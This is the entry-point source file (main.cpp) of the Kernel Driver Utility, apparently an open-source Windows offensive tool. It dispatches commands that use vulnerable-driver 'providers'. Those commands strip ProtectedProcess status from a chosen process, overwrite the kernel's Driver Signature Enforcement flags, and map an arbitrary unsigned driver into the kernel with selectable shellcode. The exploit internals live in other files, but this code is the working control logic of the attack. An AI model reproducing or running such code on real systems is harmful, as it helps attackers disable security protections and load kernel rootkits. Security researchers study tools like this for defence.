/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       MAIN.CPP
*
*  VERSION:     1.11
*
*  DATE:        14 May 2021
*
*  Hamakaze main logic and entrypoint.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#pragma data_seg("redx")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:redx,RWS")

#define CMD_PRV         L"-prv"
#define CMD_MAP         L"-map"
#define CMD_SCV         L"-scv"
#define CMD_PS          L"-ps"
#define CMD_DSE         L"-dse"
#define CMD_LIST        L"-list"
#define CMD_TEST        L"-test"

#define CMD_DRVNAME     L"-drvn"
#define CMD_DRVREG      L"-drvr"

#define T_KDUUSAGE   "[?] No valid parameters combination specified or command is not recognized, see Usage for help\r\n"\
                     "[?] Usage: kdu [Provider][Command]\r\n\n"\
                     "Parameters: \r\n"\
                     "kdu -list         - list available providers\r\n"\
                     "kdu -prv id       - optional, sets provider id to be used with rest of commands, default 0\r\n"\
                     "kdu -ps pid       - disable ProtectedProcess for given pid\r\n"\
                     "kdu -dse value    - write user defined value to the system DSE state flags\r\n"\
                     "kdu -map filename - map driver to the kernel and execute it entry point, this command have dependencies listed below\r\n"\
                     "-scv version      - optional, select shellcode version, default 1\r\n"\
                     "-drvn name        - driver object name (only valid for shellcode version 3)\r\n"\
                     "-drvr name        - optional, driver registry key name (only valid for shellcode version 3)\r\n"

#define T_PRNTDEFAULT   "%s\r\n"

/*
* KDUProcessPSObjectSwitch
*
* Purpose:
*
* Handle -ps switch.
*
*/
INT KDUProcessPSObjectSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ ULONG_PTR ProcessId
)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;

    provContext = KDUProviderCreate(ProviderId,
        HvciEnabled,
        NtBuildNumber,
        KDU_SHELLCODE_NONE,
        ActionTypeDKOM);

    if (provContext) {
        retVal = KDUControlProcess(provContext, ProcessId);
        KDUProviderRelease(provContext);
    }

    return retVal;
}

/*
* KDUProcessDSEFixSwitch
*
* Purpose:
*
* Handle -dse switch.
*
*/
INT KDUProcessDSEFixSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ ULONG DSEValue
)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;

    provContext = KDUProviderCreate(ProviderId,
        HvciEnabled,
        NtBuildNumber,
        KDU_SHELLCODE_NONE,
        ActionTypeDSECorruption);

    if (provContext) {
        retVal = KDUControlDSE(provContext, DSEValue);
        KDUProviderRelease(provContext);
    }

    return retVal;
}

/*
* KDUProcessDrvMapSwitch
*
* Purpose:
*
* Handle -map switch.
*
*/
INT KDUProcessDrvMapSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ ULONG ShellVersion,
    _In_ LPWSTR DriverFileName,
    _In_opt_ LPWSTR DriverObjectName,
    _In_opt_ LPWSTR DriverRegistryPath
)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;

    if (!RtlDoesFileExists_U(DriverFileName)) {
        
        supPrintfEvent(kduEventError, 
            "[!] Input file cannot be found, abort.\r\n");
        
        return 0;
    }

    printf_s("[*] Driver mapping using shellcode version: %lu\r\n", ShellVersion);

    if (ShellVersion == KDU_SHELLCODE_V3) {

        if (DriverObjectName == NULL) {

            supPrintfEvent(kduEventError, "[!] Driver object name is required when working with this shellcode\r\n"\
                "[?] Use the following commands to supply object name and optionally registry key name\r\n"\
                "\t-drvn [ObjectName] and/or\r\n"\
                "\t-drvr [ObjectKeyName]\r\n"\
                "\te.g. kdu -scv 3 -drvn MyName -map MyDriver.sys\r\n"
            );

            return 0;
        }
        else {
            printf_s("[+] Driver object name: \"%ws\"\r\n", DriverObjectName);
        }

        if (DriverRegistryPath) {
            printf_s("[+] Registry key name: \"%ws\"\r\n", DriverRegistryPath);
        }
        else {
            printf_s("[+] No driver registry key name specified, driver object name will be used instead\r\n");
        }

    }

    PVOID pvImage = NULL;
    NTSTATUS ntStatus = supLoadFileForMapping(DriverFileName, &pvImage);

    if ((!NT_SUCCESS(ntStatus)) || (pvImage == NULL)) {
        
        supPrintfEvent(kduEventError, 
            "[!] Error while loading input driver file, NTSTATUS (0x%lX)\r\n", ntStatus);
        
        return 0;
    }
    else {
        printf_s("[+] Input driver file loaded at 0x%p\r\n", pvImage);

        provContext = KDUProviderCreate(ProviderId,
            HvciEnabled,
            NtBuildNumber,
            ShellVersion,
            ActionTypeMapDriver);

        if (provContext) {

            if (ShellVersion == KDU_SHELLCODE_V3) {

                if (DriverObjectName) {
                    ScCreateFixedUnicodeString(&provContext->DriverObjectName,
                        DriverObjectName);

                }

                //
                // Registry path name is optional.
                // If not specified we will assume its the same name as driver object.
                //
                if (DriverRegistryPath) {
                    ScCreateFixedUnicodeString(&provContext->DriverRegistryPath,
                        DriverRegistryPath);
                }

            }

            retVal = KDUMapDriver(provContext, pvImage);
            KDUProviderRelease(provContext);
        }

        LdrUnloadDll(pvImage);
    }

    return retVal;
}

/*
* KDUProcessCommandLine
*
* Purpose:
*
* Parse command line and do stuff.
*
*/
INT KDUProcessCommandLine(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber
)
{
    INT         retVal = 0;
    ULONG       providerId = KDU_PROVIDER_DEFAULT, dseValue = 0, paramLength = 0, shellVersion;
    ULONG_PTR   processId;
    LPWSTR      lpParam1, lpParam2;
    WCHAR       szParameter[MAX_PATH], szExtraParameter[MAX_PATH];

    FUNCTION_ENTER_MSG(__FUNCTION__);

    RtlSecureZeroMemory(szParameter, sizeof(szParameter));
    RtlSecureZeroMemory(szExtraParameter, sizeof(szExtraParameter));

    do {

#ifdef _DEBUG

        //
        // Test switch, never used/present in the release build.
        //
        if (supGetCommandLineOption(CMD_TEST,
            FALSE,
            NULL,
            0,
            NULL))
        {
            KDUTest();
            retVal = 1;
            break;
        }

#endif

        //
        // List providers.
        //
        if (supGetCommandLineOption(CMD_LIST,
            FALSE,
            NULL,
            0,
            NULL))
        {
            KDUProvList();
            retVal = 1;
            break;
        }

        //
        // Select CVE provider.
        //
        if (supGetCommandLineOption(CMD_PRV,
            TRUE,
            szParameter,
            sizeof(szParameter) / sizeof(WCHAR),
            NULL))
        {
            providerId = _strtoul(szParameter);
            if (providerId >= KDUProvGetCount()) {

                supPrintfEvent(kduEventError,
                    "[!] Invalid provider id %lu specified, default will be used (%lu)\r\n",
                    providerId,
                    KDU_PROVIDER_DEFAULT);

                providerId = KDU_PROVIDER_DEFAULT;

            }

            printf_s("[+] Selected provider: %lu\r\n", providerId);
        }

        //
        // Mutually exclusive commands.
        // -dse -map -ps
        //

        //
        // Check if -dse specified.
        //
        if (supGetCommandLineOption(CMD_DSE,
            TRUE,
            szParameter,
            sizeof(szParameter) / sizeof(WCHAR),
            NULL))
        {
            dseValue = _strtoul(szParameter);
            retVal = KDUProcessDSEFixSwitch(HvciEnabled,
                NtBuildNumber,
                providerId,
                dseValue);
        }
        else

            //
            // Check if -map specified.
            //
            if (supGetCommandLineOption(CMD_MAP,
                TRUE,
                szParameter,
                sizeof(szParameter) / sizeof(WCHAR),
                &paramLength))
            {
                if (paramLength == 0) {

                    supPrintfEvent(kduEventError, 
                        "[!] Input file not specified\r\n");

                }
                else {

                    //
                    // Shell selection, -scv switch.
                    //
                    shellVersion = KDU_SHELLCODE_V1;

                    if (supGetCommandLineOption(CMD_SCV,
                        TRUE,
                        szExtraParameter,
                        sizeof(szExtraParameter) / sizeof(WCHAR),
                        NULL))
                    {
                        shellVersion = _strtoul(szExtraParameter);
                        if (shellVersion == 0 || shellVersion > KDU_SHELLCODE_VMAX) {

                            supPrintfEvent(kduEventError,
                                "[!] Unrecognized shellcode version %lu, default will be used (%lu)\r\n",
                                shellVersion,
                                KDU_SHELLCODE_V1);

                            shellVersion = KDU_SHELLCODE_V1;
                        }
                    }

                    WCHAR szDriverName[MAX_PATH], szDriverRegPath[MAX_PATH];

                    //
                    // Process extra DRVN/DRVR commands if present.
                    //
                    RtlSecureZeroMemory(szDriverName, sizeof(szDriverName));
                    paramLength = 0;
                    supGetCommandLineOption(CMD_DRVNAME,
                        TRUE,
                        szDriverName,
                        sizeof(szDriverName) / sizeof(WCHAR),
                        &paramLength);

                    lpParam1 = (paramLength != 0) ? szDriverName : NULL;

                    RtlSecureZeroMemory(szDriverRegPath, sizeof(szDriverRegPath));
                    paramLength = 0;
                    supGetCommandLineOption(CMD_DRVREG,
                        TRUE,
                        szDriverRegPath,
                        sizeof(szDriverRegPath) / sizeof(WCHAR),
                        &paramLength);

                    lpParam2 = (paramLength != 0) ? szDriverRegPath : NULL;

                    retVal = KDUProcessDrvMapSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        shellVersion,
                        szParameter,
                        lpParam1,
                        lpParam2);

                }
            }

            else

                //
                // Check if -ps specified.
                //
                if (supGetCommandLineOption(CMD_PS,
                    TRUE,
                    szParameter,
                    sizeof(szParameter) / sizeof(WCHAR),
                    NULL))
                {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessPSObjectSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        processId);
                }

                else {
                    //
                    // Nothing set, show help.
                    //
                    printf_s(T_PRNTDEFAULT, T_KDUUSAGE);
                }

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return retVal;
}

/*
* KDUMain
*
* Purpose:
*
* KDU main.
*
*/

int KDUMain()
{
    LONG x = 0;
    INT iResult = 0;
    OSVERSIONINFO osv;

#ifdef _DEBUG
    printf_s("[*] Debug Mode Run\r\n");
#endif

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {

        x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
        if (x > 1) {
            
            supPrintfEvent(kduEventError, 
                "[!] Another instance running, close it before\r\n");
            
            break;
        }

        RtlSecureZeroMemory(&osv, sizeof(osv));
        osv.dwOSVersionInfoSize = sizeof(osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
        if ((osv.dwMajorVersion < 6) ||
            (osv.dwMajorVersion == 6 && osv.dwMinorVersion == 0) ||
            (osv.dwBuildNumber == 7600))       
        {
            
            supPrintfEvent(kduEventError, 
                "[!] Unsupported WinNT version\r\n");
            
            break;
        }

        CHAR szVersion[100];

        StringCchPrintfA(szVersion, 100,
            "[*] Windows version: %u.%u build %u",
            osv.dwMajorVersion,
            osv.dwMinorVersion,
            osv.dwBuildNumber);

        printf_s(T_PRNTDEFAULT, szVersion);

        BOOLEAN secureBoot;

        if (supQuerySecureBootState(&secureBoot)) {
            printf_s("[*] SecureBoot is %sbled on this machine\r\n", secureBoot ? "ena" : "disa");
        }

        BOOLEAN hvciEnabled;
        BOOLEAN hvciStrict;
        BOOLEAN hvciIUM;

        //
        // Providers maybe *not* HVCI compatible.
        //
        if (supQueryHVCIState(&hvciEnabled, &hvciStrict, &hvciIUM)) {

            if (hvciEnabled) {
                printf_s("[*] Windows HVCI mode detected\r\n");
            }

        }

        iResult = KDUProcessCommandLine(hvciEnabled, osv.dwBuildNumber);

    } while (FALSE);

    InterlockedDecrement((PLONG)&g_lApplicationInstances);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return iResult;
}

/*
* KDUIntroBanner
*
* Purpose:
*
* Display general KDU version info.
*
*/
VOID KDUIntroBanner()
{
    IMAGE_NT_HEADERS* ntHeaders = RtlImageNtHeader(NtCurrentPeb()->ImageBaseAddress);

    printf_s("[#] Kernel Driver Utility v1.1.1 started, (c)2020 - 2021 KDU Project\r\n"\
        "[#] Build at %s, header checksum 0x%lX\r\n"\
        "[#] Supported x64 OS : Windows 7 and above\r\n", 
        __TIMESTAMP__,
        ntHeaders->OptionalHeader.CheckSum);
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
int main()
{
    

    HeapSetInformation(NULL, HeapEnableTerminationOnCorruption, NULL, 0);

    KDUIntroBanner();

    int retVal = 0;

    __try {
        retVal = KDUMain();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf_s("[!] Unhandled exception 0x%lx\r\n", GetExceptionCode());
        return -1;
    }

    printf_s("[+] Return value: %d. Bye-bye!\r\n", retVal);
    return retVal;
}
